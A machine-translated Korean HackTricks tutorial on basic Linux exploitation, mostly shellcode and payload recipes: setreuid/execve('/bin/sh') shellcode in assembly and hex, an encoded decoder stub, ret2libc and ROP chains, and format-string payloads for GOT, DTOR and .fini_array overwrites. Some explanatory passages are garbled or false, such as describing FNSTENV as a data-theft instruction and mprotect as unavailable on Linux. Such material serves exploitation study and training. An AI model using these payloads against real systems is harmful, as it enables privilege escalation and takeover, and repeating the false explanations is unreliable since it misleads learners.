# Linux Exploiting (Basic) (SPA)

## Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>

## **ASLR**

Aleatorización de direcciones

**전역 ASLR 비활성화 (루트)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
전역 ASLR 다시 활성화: echo 2 > /proc/sys/kernel/randomize\_va\_space

**실행 중 비활성화** (루트 권한이 필요하지 않음):\
setarch \`arch\` -R ./example arguments\
setarch \`uname -m\` -R ./example arguments

**스택 실행 보호 비활성화**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack example.c -o example

**코어 파일**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**Text**\
**Data**\
**BSS**\
**Heap**

**Stack**

**BSS 섹션**: 초기화되지 않은 전역 또는 정적 변수
```
static int i;
```
**데이터 섹션**: 초기화된 전역 또는 정적 변수
```
int i = 5;
```
**텍스트 섹션**: 코드 지침 (opcodes) 지침

**힙 섹션**: 동적으로 할당된 버퍼 (malloc(), calloc(), realloc())

**스택 섹션**: 스택 (전달된 인수, 환경 문자열 (env), 로컬 변수...)

## **1. 스택 오버플로우**

> 버퍼 오버플로우, 버퍼 침범, 스택 침범, 스택 스매싱

Segmentation fault 또는 segment violation: 프로세스에 할당되지 않은 메모리 주소에 액세스하려고 할 때 발생합니다.

프로그램 내의 함수 주소를 얻으려면 다음을 수행할 수 있습니다:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execve 호출

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2. 쉘코드**

커널 인터럽트 확인: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep "\_\_NR\_"

setreuid(0,0); // \_\_NR\_setreuid 70\
execve("/bin/sh", args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax를 초기화\
xor ebx, ebx ; ebx = 0, 전달할 인자가 없음\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; 시스템 콜 실행

**nasm -f elf assembly.asm** —> .o 파일 생성\
**ld assembly.o -o shellcodeout** —> 어셈블리 코드로 이루어진 실행 파일 생성, **objdump**를 사용하여 옵코드 추출 가능\
**objdump -d -Mintel ./shellcodeout** —> 쉘코드가 맞는지 확인하고 옵코드 추출

**쉘코드가 작동하는지 확인**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**strace ./PROGRAMA_COMPILADO** 명령을 사용하여 시스템 호출이 올바르게 수행되는지 확인할 수 있습니다.

쉘코드를 작성할 때 트릭을 사용할 수 있습니다. 첫 번째 명령은 호출로 이루어진 점프입니다. 호출은 원래 코드를 호출하고 EIP를 스택에 넣습니다. 호출 명령 다음에 필요한 문자열을 넣었으므로 해당 EIP를 사용하여 문자열을 가리킬 수 있으며 코드를 계속 실행할 수 있습니다.

예시 **트릭 (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Stack을 사용한 쉘 실행(EJ):**

```c
#include <stdio.h>

void vulnerable_function() {
    char buffer[100];
    printf("Enter a string: ");
    gets(buffer);
    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable_function();
    return 0;
}
```

위의 코드는 취약한 함수 `vulnerable_function`을 포함하고 있습니다. 이 함수는 사용자로부터 입력을 받아서 `buffer` 배열에 저장한 후, 해당 값을 출력합니다. 그러나 `gets` 함수를 사용하여 입력을 받기 때문에 버퍼 오버플로우 취약점이 존재합니다.

이 취약점을 이용하여 `/bin/sh` 쉘을 실행하는 방법은 다음과 같습니다:

1. `buffer` 배열에 `/bin/sh` 문자열을 삽입합니다.
2. `vulnerable_function`을 호출할 때, `buffer` 배열에 저장된 `/bin/sh` 문자열이 스택의 주소를 덮어씁니다.
3. `vulnerable_function`이 종료되고 `main` 함수로 돌아갈 때, 스택에 저장된 주소를 참조하여 `/bin/sh` 쉘을 실행합니다.

이를 통해 공격자는 쉘 권한을 획득하여 시스템을 제어할 수 있게 됩니다.
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**

EJ FNSTENV는 x86 아키텍처에서 사용되는 명령어입니다. 이 명령어는 현재 프로세서의 FPU (부동 소수점 유닛) 상태를 저장하는 데 사용됩니다. FPU 상태는 부동 소수점 연산을 수행하는 데 필요한 레지스터 값 및 제어 정보를 포함합니다.

이 명령어는 주로 스택 버퍼 오버플로우 취약점을 이용하여 공격하는 과정에서 사용됩니다. 공격자는 EJ FNSTENV 명령어를 사용하여 FPU 상태를 저장하고, 이를 통해 FPU 상태 정보를 분석하여 공격에 활용할 수 있습니다.

EJ FNSTENV 명령어는 공격자가 공격 대상 시스템에서 메모리 누수를 발생시킬 수 있는 기능을 제공합니다. 이를 통해 공격자는 시스템의 중요한 정보를 탈취하거나 악성 코드를 실행하는 등의 공격을 수행할 수 있습니다.

이 명령어는 주로 리눅스 시스템에서 사용되며, 공격자는 이를 이용하여 시스템을 해킹하거나 취약점을 악용할 수 있습니다. 따라서 시스템 관리자는 EJ FNSTENV 명령어를 이용한 공격으로부터 시스템을 보호하기 위해 적절한 보안 조치를 취해야 합니다.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Hunter:**

작은 코드로, 프로세스에 연결된 메모리 페이지를 순회하면서 거기에 저장된 쉘코드를 찾는 것입니다 (쉘코드에 특정한 서명을 찾습니다). 코드를 주입할 공간이 매우 작은 경우에 유용합니다.

**다형성 쉘코드**

암호화된 쉘 코드로, 해독하고 해당 코드로 점프하는 작은 코드를 가지고 있습니다. Call-Pop 트릭을 사용하는 것이 이의 예입니다. Caesar 암호화된 코드가 여기에 예시입니다:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **Frame Pointer (EBP) 공격**

EBP를 수정할 수 있지만 EIP를 수정할 수 없는 상황에서 유용합니다.

함수를 빠져나올 때 다음 어셈블리 코드가 실행되는 것으로 알려져 있습니다:
```
movl               %ebp, %esp
popl                %ebp
ret
```
이렇게 하면 다른 함수에 의해 호출된 함수 (fvuln)에서 나올 때 EBP를 수정할 수 있습니다. 호출한 함수가 fvuln을 호출한 후에 종료되면 EIP를 수정할 수 있습니다.

fvuln에서는 EBP를 가짜로 설정하여 쉘코드의 주소가 있는 위치를 가리킬 수 있습니다. + 4 (pop을 위해 4를 더해야 함). 따라서 함수를 빠져 나올 때 ESP에 &(\&Shellcode)+4의 값이 들어가고, pop으로 ESP에서 4를 빼면 ESP는 ret가 실행될 때 쉘코드의 주소를 가리키게 됩니다.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + 패딩 + &(\&Shellcode)+4

**Off-by-One Exploit**\
EBP의 가장 낮은 바이트만 수정할 수 있습니다. 이전과 같은 공격을 수행할 수 있지만, 쉘코드 주소를 저장하는 메모리는 EBP와 처음 3바이트를 공유해야 합니다.

## **4. return to Libc 방법**

스택이 실행 가능하지 않거나 수정하기에 너무 작은 버퍼를 남기는 경우 유용한 방법입니다.

ASLR은 각 실행마다 함수가 메모리의 다른 위치에 로드되도록 합니다. 따라서 이 방법은 그 경우에 효과적이지 않을 수 있습니다. 원격 서버의 경우, 프로그램이 항상 동일한 주소에서 실행되므로 유용할 수 있습니다.

* **cdecl(C declaration)** : 인수를 스택에 넣고 함수를 빠져 나올 때 스택을 정리합니다.
* **stdcall(standard call)** : 인수를 스택에 넣고 호출된 함수가 스택을 정리합니다.
* **fastcall** : 처음 두 개의 인수를 레지스터에 넣고 나머지를 스택에 넣습니다.

libc의 system 명령의 주소를 넣고 일반적으로 환경 변수에서 문자열 "/bin/sh"를 인수로 전달합니다. 또한, 프로그램이 더 이상 쉘을 필요로하지 않을 때 문제없이 종료되도록 exit 함수의 주소를 사용합니다 (로그를 기록하지 않기 위해).

**export SHELL=/bin/sh**

필요한 주소를 찾기 위해 다음을 확인할 수 있습니다. **GDB에서:**\
**p system**\
**p exit**\
**rabin2 -i 실행파일** —> 프로그램이 로드될 때 사용하는 모든 함수의 주소를 제공합니다.\
(시작 또는 어떤 중단점에서): **x/500s $esp** —> 여기에서 /bin/sh 문자열을 찾습니다.

이러한 주소를 얻으면 **exploit**은 다음과 같이 됩니다:

"A" \* EBP까지의 거리 + 4 (EBP: 4개의 "A"일 수 있지만 세그멘테이션 오류를 피하기 위해 실제 EBP가 좋습니다) + **system**의 주소 (EIP를 덮어씁니다) + **exit**의 주소 (system("/bin/sh")를 실행한 후에 이 함수가 호출됩니다. 스택의 처음 4바이트는 실행할 다음 EIP 주소로 처리됩니다) + "**/bin/sh**"의 주소 (system에 전달되는 매개변수가 될 것입니다)

이렇게 하면 EIP가 system 함수의 주소로 덮어씌워지고, 이 함수는 "/bin/sh" 문자열을 매개변수로 받아 실행한 후 exit() 함수를 실행합니다.

어떤 함수의 주소 중 일부 바이트가 null 또는 공백 (\x20)일 수 있습니다. 이 경우 해당 함수 이전의 주소를 disassemble하여 직접 함수 대신에 그 중 하나를 호출할 수 있는 여러 NOP를 찾을 수 있습니다 (예: > x/8i system-4).

이 방법은 system과 같은 함수를 호출할 때 **call** 대신 **ret** opcode를 사용하므로 함수가 처음 4바이트를 돌아갈 주소로 이해하기 때문에 작동합니다.

이 방법의 흥미로운 기술은 **strncpy()**을 호출하여 스택에서 힙으로 페이로드를 이동시키고, 그 후 **gets()**를 사용하여 해당 페이로드를 실행하는 것입니다.

다른 흥미로운 기술은 **mprotect()**의 사용입니다. 이 함수는 메모리의 원하는 부분에 원하는 권한을 할당할 수 있습니다. 이 기능은 BDS, MacOS 및 OpenBSD에서 사용할 수 있지만 Linux에서는 사용할 수 없습니다 (쓰기 및 실행 권한을 동시에 부여할 수 없도록 제어됩니다). 이 공격을 사용하면 스택을 다시 실행 가능하도록 다시 설정할 수 있습니다.

**함수 체인**

이전 기술을 기반으로 한 이 방법은 다음과 같습니다:\
패딩 + \&Function1 + \&pop;ret; + \&arg\_fun1 + \&Function2 + \&pop;ret; + \&arg\_fun2 + ...

이렇게 하면 호출할 함수를 연결할 수 있습니다. 또한, 여러 인수를 사용하는 함수를 사용하려면 필요한 인수를 넣고 opcodes가 있는 위치를 찾을 수 있습니다: pop, pop, pop, pop, ret —> **objdump -d 실행파일**

**프레임 위조를 통한 체인**

EBP를 조작할 수 있는 기능을 활용하여 EBP와 "leave;ret"을 통해 여러 함수의 실행을 연결하는 것입니다.

패딩

* EBP에 함수를 실행하는 가짜 EBP를 배치합니다: (2번째 가짜 EBP + 실행할 함수: (\&system() + \&leave;ret + &"/bin/sh")
* EIP에는 &(leave;ret) 함수의 주소를 넣습니다.

다음 부분의 주소로 시작하는 쉘코드를 시작합니다. 예를 들어: 2번째 가짜 EBP + \&system() + &(leave;ret;) + &"/bin/sh"

2번째 EBP는 다음과 같습니다: 3번째 가짜 EBP + \&system() + &(leave;ret;) + &"/bin/ls"

이 쉘코드는 메모리의 액세스 가능한 부분에 계속 반복해서 배치되므로 작은 메모리 조각으로 쉽게 분할할 수 있는 쉘코드를 얻을 수 있습니다.

(이전에 본 EBP 및 ret2lib 취약점을 혼합하여 함수 실행을 연결합니다)

## **5. 보조 방법**

**Ret2Ret**

스택의 주소를 EIP에 넣을 수 없는 경우 (EIP에 0xbf가 포함되어 있는지 확인) 또는 쉘코드의 위치를 계산할 수 없는 경우에 유용합니다. 그러나 취약한 함수가 매개변수를 허용하는 경우 (쉘코드는 여기에 배치됨)입니다.

이렇게 하면 EIP를 **ret**의 주소로 변경하면 다음 주소 (함수의 첫 번째 인수의 주소)가 로드됩니다. 즉, 쉘코드가 로드됩니다.

Exploit은 다음과 같습니다: SHELLCODE + 패딩 (EIP까지) + **\&ret** (스택의 다음 바이트는 전달된 매개변수의 주소이므로 쉘코드의 시작 주소입니다)

**strncpy**와 같은 함수는 완료되면 쉘코드가 저장된 주소를 스택에서 제거하여 이 기술을 불가능하게 할 수 있습니다. 즉, 함수에 전달되는 인수로 전달되는 주소 (쉘코드를 저장하는 주소)는 0x00으로 수정되므로 두 번째 **ret**을 호출하면 0x00을 만나 프로그램이 종료됩니다.
```
**Ret2PopRet**
```
만약 첫 번째 인수에는 제어할 수 없지만 두 번째나 세 번째 인수에는 제어할 수 있다면, pop-ret 또는 pop-pop-ret 주소로 EIP를 덮어쓸 수 있다.

**Murat 기법**

리눅스에서 모든 프로그램은 0xbfffffff부터 매핑된다.

리눅스에서 새로운 프로세스의 스택이 어떻게 구성되는지 살펴보면, 프로그램이 쉘코드만 있는 환경에서 실행되도록 exploit을 개발할 수 있다. 이때 쉘코드의 주소는 다음과 같이 계산할 수 있다: addr = 0xbfffffff - 4 - strlen(전체 실행 파일 이름) - strlen(쉘코드)

이렇게 하면 쉘코드가 있는 환경 변수의 주소를 쉽게 얻을 수 있다.

이는 execle 함수가 원하는 환경 변수만 있는 환경을 생성할 수 있기 때문에 가능하다.

**ESP로 이동: Windows 스타일**

ESP는 항상 스택의 시작을 가리키므로, 이 기법은 EIP를 **jmp esp** 또는 **call esp** 호출로 대체하는 것이다. 이렇게 하면 EIP를 덮어쓴 후에 쉘코드를 저장할 수 있으며, **ret**을 실행한 후 ESP는 바로 다음 주소를 가리키게 되어 쉘코드가 저장된 위치에 도달한다.

Windows나 Linux에서 ASLR이 비활성화되어 있지 않은 경우, 공유 객체에 저장된 **jmp esp** 또는 **call esp**를 호출할 수 있다. ASLR이 활성화된 경우, 취약한 프로그램 자체에서 찾을 수 있다.

또한, EIP 오염 후에 쉘코드를 스택 중간이 아닌 오염된 EIP 뒤에 배치할 수 있기 때문에, 함수 내에서 실행되는 push 또는 pop 명령이 쉘코드에 영향을 주지 않는다.

이와 매우 유사하게, 함수가 쉘코드가 저장된 주소를 반환하는 것을 알고 있다면 **call eax** 또는 **jmp eax (ret2eax)**를 호출할 수 있다.

**ROP (Return Oriented Programming) 또는 borrowed code chunks**

호출되는 코드 조각을 가젯(gadgets)이라고 한다.

이 기법은 **ret2libc** 기법과 **pop,ret**을 사용하여 다른 함수 호출을 연결하는 것이다.

일부 프로세서 아키텍처에서는 각 명령이 32비트의 집합으로 구성된다(MIPS 예시). 그러나 인텔에서는 명령이 가변 크기이며 여러 명령이 동일한 비트 집합을 공유할 수 있다. 예를 들어:

**movl $0xe4ff, -0x(%ebp)** —> 0xffe4 바이트를 포함하며, 이는 **jmp \*%esp**로 해석된다.

이렇게 하면 원래 프로그램에 실제로 없는 몇 가지 명령을 실행할 수 있다.

**ROPgadget.py**는 이진 파일에서 값을 찾는 데 도움이 된다.

이 프로그램은 또한 **페이로드**를 생성하는 데 사용된다. 원하는 라이브러리에서 ROP를 가져와서 해당 라이브러리의 주소를 제공하면, 페이로드가 파이썬으로 생성되어 사용할 준비가 된다. 또한 시스템 호출을 사용하기 때문에 실제로 스택에서 아무것도 실행하지 않고 ROP 주소만 저장하고 **ret**을 통해 실행된다. 이 페이로드를 사용하려면 **ret** 명령으로 페이로드를 호출해야 한다.

**정수 오버플로우**

이러한 유형의 오버플로우는 변수가 전달된 숫자만큼 큰 수를 처리할 준비가 되어 있지 않을 때 발생한다. 부호 있는 변수와 부호 없는 변수 사이의 혼동으로 인해 발생할 수 있다. 예를 들어:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
이전 예제에서는 프로그램이 2개의 매개변수를 기다리는 것을 볼 수 있습니다. 첫 번째 매개변수는 다음 문자열의 길이이고, 두 번째 매개변수는 문자열입니다.

첫 번째 매개변수로 음수를 전달하면 len < 256이 되어 이 필터를 통과하게 되고, 또한 strlen(buffer)도 l보다 작아지게 됩니다. 왜냐하면 l은 unsigned int이고 매우 큰 값이기 때문입니다.

이러한 종류의 오버플로우는 프로그램의 프로세스에 무언가를 쓰는 것을 목표로하지 않고, 다른 취약점을 악용하기 위해 잘못 설계된 필터를 우회하는 것입니다.

**초기화되지 않은 변수**

초기화되지 않은 변수가 어떤 값을 가질 수 있는지 알 수 없으며, 이를 관찰하는 것이 흥미로울 수 있습니다. 이전 함수의 변수가 가지던 값을 가질 수 있으며, 이 값은 공격자에 의해 제어될 수 있습니다.

## **포맷 문자열**

C에서 **`printf`**는 문자열을 **출력**하는 데 사용할 수 있는 함수입니다. 이 함수가 기대하는 **첫 번째 매개변수**는 **포맷터를 포함한 원시 텍스트**입니다. 기대되는 **다음 매개변수**는 원시 텍스트에서 **포맷터를 대체**할 **값**입니다.

취약점은 이 함수에 첫 번째 인수로 **공격자 텍스트**가 입력될 때 발생합니다. 공격자는 **printf 포맷 문자열 기능을 악용**하여 **임의의 데이터를 임의의 주소에 쓸 수** 있는 **특수한 입력을 만들 수** 있습니다. 이를 통해 임의의 코드를 실행할 수 있습니다.

포맷터:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`**은 **지정된 주소에 쓰여진 바이트 수**를 **기록**합니다. 쓰여져야 하는 바이트 수만큼의 16진수 숫자를 쓰는 것으로, **어떤 데이터든 쓸 수** 있습니다.
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

이 테이블은 프로그램에서 사용되는 외부 함수의 주소를 포함하고 있습니다.

이 테이블의 주소를 가져오려면 다음을 사용하십시오: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

GEF에서 실행 파일을 로드한 후에는 GEF에서 **GOT**에 있는 **함수**를 볼 수 있습니다: `gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEF를 사용하여 디버깅 세션을 시작하고 **`got`**을 실행하여 got 테이블을 볼 수 있습니다:

![](<../../.gitbook/assets/image (621).png>)

바이너리에서 GOT는 함수의 주소 또는 함수 주소를 로드할 PLT 섹션의 주소를 가지고 있습니다. 이 취약점의 목표는 나중에 실행될 함수의 GOT 항목을 `system` 함수의 PLT 주소로 **덮어쓰는 것**입니다. 이상적으로는, **사용자가 제어하는 매개변수로 호출될 함수**의 GOT를 덮어쓸 것입니다 (따라서 시스템 함수에 전달되는 매개변수를 제어할 수 있게 됩니다).

스크립트에서 **`system`**을 사용하지 않는 경우, 시스템 함수는 GOT에 항목이 없을 것입니다. 이 경우에는 먼저 `system` 함수의 주소를 **유출해야 합니다**.

**Procedure Linkage Table**은 ELF 파일에서 필요한 **해결이 필요한 모든 심볼**을 저장하는 **읽기 전용** 테이블입니다. 이러한 함수 중 하나가 호출되면 GOT는 플로우를 PLT로 **리디렉션**하여 함수의 주소를 **해결**하고 GOT에 기록합니다.\
그런 다음 해당 주소로 호출이 수행될 때 함수는 해결할 필요 없이 **직접 호출**됩니다.

PLT 주소는 **`objdump -j .plt -d ./vuln_binary`**로 볼 수 있습니다.

### **Exploit Flow**

이전에 설명한 대로 목표는 나중에 호출될 **GOT 테이블의 함수 주소를 덮어쓰는 것**입니다. 이상적으로는 실행 가능한 섹션에 있는 쉘코드의 주소를 설정할 수 있지만, 실행 가능한 섹션에 쉘코드를 작성할 수 없을 가능성이 높습니다.\
따라서 다른 옵션은 사용자로부터 인수를 받는 함수를 덮어쓰고 그것을 **`system` 함수**로 지정하는 것입니다.

주소를 쓰기 위해 일반적으로 2단계를 수행합니다: **먼저 주소의 2바이트를 쓰고** 다른 2바이트를 씁니다. 이를 위해 **`$hn`**을 사용합니다.

**HOB**는 주소의 상위 2바이트를 가리킵니다.\
**LOB**는 주소의 하위 2바이트를 가리킵니다.

따라서 형식 문자열이 작동하는 방식 때문에 \[HOB, LOB] 중 **더 작은 것을 먼저 써야 합니다**.

만약 HOB < LOB이라면\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

만약 HOB > LOB이라면\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Format String Exploit Template**

GOT를 사용하여 형식 문자열을 이용한 공격에 대한 **템플릿**을 여기에서 찾을 수 있습니다:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

이것은 **프로그램이 종료되기 전에 호출될 함수**를 포함하는 구조체입니다. 이는 주소로 점프하여 쉘코드를 호출할 수 있는 경우나 형식 문자열을 두 번째로 **공격하기 위해 다시 main으로 돌아가야 하는 경우**에 유용합니다.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
**무한 루프**를 만들지 않기 때문에 이것은 **영구적인 루프를 생성하지 않습니다**. 메인으로 돌아갈 때 카나리아가 감지하고 스택의 끝이 손상되어 함수가 다시 호출되지 않을 것입니다. 따라서 이를 통해 취약점의 **1번 더 실행**을 할 수 있습니다.

### **포맷 문자열을 사용하여 내용 덤프하기**

포맷 문자열은 프로그램의 메모리에서 **내용을 덤프**하는 데에도 악용될 수 있습니다.\
예를 들어, 다음 상황에서는 **플래그를 가리키는 스택의 로컬 변수**가 있습니다. **메모리**에서 **플래그를 가리키는 포인터**가 어디에 있는지 **찾으면**, **printf가 해당 주소에 접근**하여 **플래그를 출력**할 수 있습니다:

따라서 플래그는 **0xffffcf4c**에 있습니다.

![](<../../.gitbook/assets/image (618) (2).png>)

그리고 누출에서 **플래그를 가리키는 포인터**가 **8번째** 매개변수에 있다는 것을 볼 수 있습니다:

![](<../../.gitbook/assets/image (623).png>)

따라서 **8번째 매개변수에 접근**하면 플래그를 얻을 수 있습니다:

![](<../../.gitbook/assets/image (624).png>)

이전 취약점을 따라가고 내용을 누출할 수 있다는 것을 깨달은 후에는 **printf에 포인터를 설정**하여 **실행 가능한 부분이 로드**되는 곳으로 포인터를 설정하고 **전체적으로 덤프**할 수 있습니다!

### **DTOR**

{% hint style="danger" %}
현재는 dtor 섹션을 가진 이진 파일을 찾기가 매우 **이상합니다**.
{% endhint %}

소멸자는 프로그램이 종료되기 전에 **실행되는 함수**입니다.\
**`__DTOR_END__`**에 **쉘코드의 주소**를 **작성**하면 프로그램이 종료되기 전에 **실행**됩니다.\
이 섹션의 주소를 가져오려면 다음을 사용하세요:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
일반적으로 **DTOR** 섹션은 값 `ffffffff`와 `00000000` 사이에 **위치**합니다. 따라서 이러한 값만 보이면 **등록된 함수가 없음**을 의미합니다. 따라서 **`00000000`**을 **쉘코드의 주소**로 덮어씌워 실행할 수 있습니다.

### **버퍼 오버플로우를 위한 포맷 문자열**

**sprintf**는 형식이 있는 문자열을 **변수로 이동**합니다. 따라서 문자열의 **포맷팅을 악용**하여 복사되는 내용이 있는 변수에서 **버퍼 오버플로우를 유발**할 수 있습니다.\
예를 들어, 페이로드 `%.44xAAAA`는 변수에 44B+"AAAA"를 **쓸 것**이며, 이는 버퍼 오버플로우를 일으킬 수 있습니다.

### **\_\_atexit 구조체**

{% hint style="danger" %}
현재는 이를 악용하는 것이 매우 **이상합니다**.
{% endhint %}

**`atexit()`**는 **다른 함수들이 매개변수로 전달되는 함수**입니다. 이러한 **함수들**은 **`exit()`**를 실행하거나 **main**의 **리턴**을 실행할 때 **실행**됩니다.\
예를 들어, 이러한 함수들 중 하나의 **주소**를 쉘코드를 가리키도록 **수정**할 수 있다면, 프로세스를 **제어**할 수 있지만 현재로서는 이것이 더 복잡해졌습니다.\
현재 **실행될 함수들의 주소**는 여러 구조체 뒤에 **숨겨져** 있으며, 마지막으로 가리키는 주소는 함수들의 주소가 아니라 **XOR로 암호화**되고 **임의의 키**로 이동됩니다. 따라서 현재 이 공격 벡터는 **x86** 및 **x64\_86**에서는 **매우 유용하지 않습니다**.\
**암호화 함수**는 **`PTR_MANGLE`**입니다. m68k, mips32, mips64, aarch64, arm, hppa와 같은 **다른 아키텍처**는 **암호화** 함수를 **구현하지 않습니다**. 이러한 아키텍처는 이 벡터에 의해 공격 가능합니다.

### **setjmp() & longjmp()**

{% hint style="danger" %}
현재는 이를 악용하는 것이 매우 **이상합니다**.
{% endhint %}

**`Setjmp()`**는 **컨텍스트** (레지스터)를 **저장**할 수 있습니다.\
**`longjmp()`**는 **컨텍스트**를 **복원**할 수 있습니다.\
저장된 레지스터는 `EBX, ESI, EDI, ESP, EIP, EBP`입니다.\
문제는 EIP와 ESP가 **`PTR_MANGLE`** 함수를 통과하기 때문에 이 공격에 취약한 **아키텍처는 위와 동일**합니다.\
이들은 오류 복구 또는 인터럽트에 유용합니다.\
그러나 내가 읽은 바에 따르면, 다른 레지스터는 보호되지 않습니다. 따라서 호출되는 함수 내부에 `call ebx`, `call esi` 또는 `call edi`가 있다면 제어를 가져올 수 있습니다. 또는 EBP를 수정하여 ESP를 수정할 수도 있습니다.

**C++의 VTable 및 VPTR**

각 클래스에는 메서드에 대한 **포인터 배열인 Vtable**이 있습니다.

각 **클래스**의 객체에는 해당 클래스의 배열을 가리키는 **포인터인 VPtr**이 있습니다. VPtr은 각 객체의 헤더의 일부입니다. 따라서 VPtr을 **덮어쓰기**하여 함수를 실행하면 쉘코드로 이동할 수 있습니다.

## **예방 및 회피 조치**

**ASLR은 그리 무작위적이지 않습니다**

PaX는 프로세스의 주소 공간을 3개의 그룹으로 분할합니다:

코드 및 초기화되지 않은 데이터: .text, .data 및 .bss —> 변수 delta\_exec에 16비트의 엔트로피가 있으며, 이 변수는 각 프로세스마다 무작위로 초기화되고 초기 주소에 더해집니다.

mmap()에 의해 할당된 메모리 및 공유 라이브러리 —> 16비트, delta\_mmap

